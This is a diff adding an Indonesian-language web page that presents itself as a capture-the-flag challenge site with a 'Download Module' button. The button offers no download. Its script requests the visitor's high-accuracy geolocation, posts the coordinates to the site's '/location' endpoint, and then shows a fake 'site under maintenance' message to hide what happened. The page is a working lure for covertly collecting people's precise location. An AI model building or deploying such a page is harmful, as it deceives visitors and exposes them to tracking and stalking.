@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>CTF Challenge — Capture The Flag</title>
+  
+  <meta property="og:title" content="CTF Challenge — Capture The Flag">
+  <meta property="og:description" content="Pecahkan challenge, tingkatkan skill, dan taklukkan dunia CTF. Mulai perjalananmu sekarang.">
+  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ByexeOfficial999/image-to-url@main/1000597348.png">
+  <meta property="og:url" content="https://ctfid.com">
+  <meta property="og:type" content="website">
+
+  <meta property="og:site_name" content="CTF Challenge — Capture The Flag">
+  <meta property="og:locale" content="id_ID">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html {
+      height: 100%;
+      overflow: hidden;
+    }
+
+    body {
+      height: 100%;
+      overflow: hidden;
+      position: fixed;
+      width: 100%;
+      top: 0; left: 0;
+    }
+
+.overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.35);
+      z-index: 1;
+    }
+
+    .btn-wrap {
+      position: fixed;
+      bottom: 50px;
+      left: 0;
+      right: 0;
+      z-index: 2;
+      display: flex;
+      justify-content: center;
+    }
+
+    button {
+      padding: 1rem 3rem;
+      font-size: 1rem;
+      font-weight: 700;
+      color: #fff;
+      background: #2563EB;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 8px 28px rgba(37,99,235,0.5);
+      transition: background .2s, transform .15s;
+    }
+
+    button:hover  { background: #1D4ED8; transform: translateY(-2px); }
+    button:active { transform: scale(.97); }
+  </style>
+</head>
+<body>
+
+  <img src="https://cdn.jsdelivr.net/gh/ByexeOfficial999/image-to-url@main/1000597299.png" style="position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:0;"/>
+
+  <div class="overlay"></div>
+
+  <div class="btn-wrap">
+    <button onclick="requestLocation()">Download Module</button>
+  </div>
+
+  <script>
+function requestLocation(){
+      if(!navigator.geolocation){ return; }
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos)=>{
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          await fetch("/location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ lat, lon })
+          });
+
+          alert("Situs ini sedang dalam perbaikan. Coba lagi nanti.");
+        },
+        ()=>{ alert("Verifikasi Gagal"); },
+        { enableHighAccuracy: true }
+      );
+    }
+  </script>
+
+</body>
+</html>
